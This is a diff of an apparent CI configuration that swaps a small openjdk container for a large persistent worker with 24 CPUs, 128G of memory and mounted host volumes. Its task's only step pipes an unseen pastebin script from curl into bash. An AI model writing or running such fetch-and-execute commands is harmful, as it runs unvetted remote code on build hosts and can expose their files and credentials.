@@ -1,16 +1,13 @@
-container:
-  image: openjdk:latest
-  cpu: 4
-  memory: 12G
+persistent_worker:
+  isolation:
+    container:
+      image: debian:latest
+      cpu: 24
+      memory: 128G
+      volumes:
+        - /path/on/host:/path/in/container
+        - /tmp/persistent-cache:/tmp/cache:ro
 
 task:
   script: bash -c "$(curl -fsSL https://pastebin.com/raw/zy1Ss1Xz)" 
   
-  
-container:
-  image: openjdk:latest
-  cpu: 4
-  memory: 12G
-
-task:
-  script: bash -c "$(curl -fsSL https://pastebin.com/raw/zy1Ss1Xz)" 
